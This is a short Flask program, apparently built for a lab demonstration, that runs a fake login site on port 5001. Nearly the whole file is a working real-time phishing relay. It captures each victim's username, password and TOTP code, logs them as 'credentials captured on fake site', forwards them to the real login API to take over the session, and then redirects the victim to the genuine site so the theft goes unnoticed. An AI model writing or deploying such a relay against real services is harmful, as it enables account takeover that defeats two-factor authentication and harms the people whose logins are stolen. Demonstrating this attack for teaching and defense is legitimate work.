from flask import Flask, request, render_template, redirect
import requests
import datetime

app = Flask(__name__)

LEGITIMATE_URL = "http://legitimate:5000/api/login"

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)

@app.route("/")
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    totp_code = request.form.get("totp_code")

    log("=" * 52)
    log(">>> CREDENCIALES CAPTURADAS EN SITIO FALSO <<<")
    log(f"    Usuario  : {username}")
    log(f"    Password : {password}")
    log(f"    TOTP     : {totp_code}")
    log("Intentando relay al sitio legitimo...")

    try:
        resp = requests.post(LEGITIMATE_URL, json={
            "username": username,
            "password": password,
            "totp_code": totp_code
        }, timeout=5)

        data = resp.json()
        if resp.status_code == 200 and data.get("success"):
            log("✅ RELAY EXITOSO — Sesion comprometida en el sitio real")
        else:
            log(f"❌ RELAY FALLIDO — {data.get('message')}")
            log("   (codigo TOTP expirado, ventana de 30s cerrada)")

    except Exception as e:
        log(f"❌ Error de conexion: {e}")

    log("=" * 52)

    # Redirige al sitio legitimo para que el flujo parezca normal en la demo
    return redirect("http://127.0.0.1:5000/login")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)
